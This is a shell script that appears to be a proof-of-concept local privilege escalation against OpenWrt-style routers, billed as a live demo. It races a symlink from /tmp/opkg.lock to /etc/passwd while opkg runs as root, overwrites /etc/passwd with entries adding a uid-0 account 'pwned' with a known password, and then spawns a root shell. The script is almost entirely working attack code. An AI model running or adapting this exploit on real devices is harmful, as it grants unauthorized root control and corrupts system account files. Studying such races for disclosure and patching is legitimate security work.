#!/bin/sh
#
# Automated Symlink Race Privilege Escalation
# Single-script version for live demo
#

ATTACKER="pwned"
# Password: 'pwned123' - pre-computed hash
HASH='$1$abcd$CdN/ebc49tiQ8Vv.5gOpO/'

GREEN='\033[0;32m'
RED='\033[0;31m'
NC='\033[0m'

die() { echo "${RED}[-]${NC} $1"; exit 1; }
ok()  { echo "${GREEN}[+]${NC} $1"; }

[ "$(id -u)" = "0" ] && die "Don't run as root - that defeats the purpose"

ok "Current user: $(whoami) (uid=$(id -u))"
ok "Target: Add user '$ATTACKER' with uid 0"

# Backup
cp /etc/passwd /tmp/passwd.bak 2>/dev/null && ok "Backed up /etc/passwd"

# Generate payload
PAYLOAD="root:x:0:0:root:/root:/bin/ash
${ATTACKER}:${HASH}:0:0::/root:/bin/ash
nobody:*:65534:65534:nobody:/var:/bin/false"

ok "Starting race condition..."
ok "Waiting for opkg-call trigger (run 'opkg update' via LuCI)"

# Race loop - plant symlink continuously
(
    while true; do
        rm -f /tmp/opkg.lock 2>/dev/null
        ln -sf /etc/passwd /tmp/opkg.lock 2>/dev/null
        usleep 5000 2>/dev/null || sleep 0.005
    done
) &
RACE_PID=$!

# Monitor for truncation
TRIES=0
while [ $TRIES -lt 6000 ]; do  # ~60 second timeout
    if [ -f /etc/passwd ]; then
        SIZE=$(wc -c < /etc/passwd 2>/dev/null)
        if [ "$SIZE" -lt 50 ]; then
            ok "RACE WON! /etc/passwd truncated"
            echo "$PAYLOAD" > /etc/passwd
            ok "Payload injected"
            break
        fi
    fi
    TRIES=$((TRIES + 1))
    usleep 10000 2>/dev/null || sleep 0.01
done

kill $RACE_PID 2>/dev/null

# Verify
if grep -q "^${ATTACKER}:.*:0:" /etc/passwd; then
    ok "SUCCESS! Privilege escalation complete"
    echo ""
    echo "  User:     $ATTACKER"
    echo "  Password: pwned123"
    echo "  UID:      0 (root)"
    echo ""
    ok "Spawning root shell..."
    exec su "$ATTACKER" -c "/bin/ash"
else
    die "Exploit failed - race lost or opkg-call not triggered"
fi
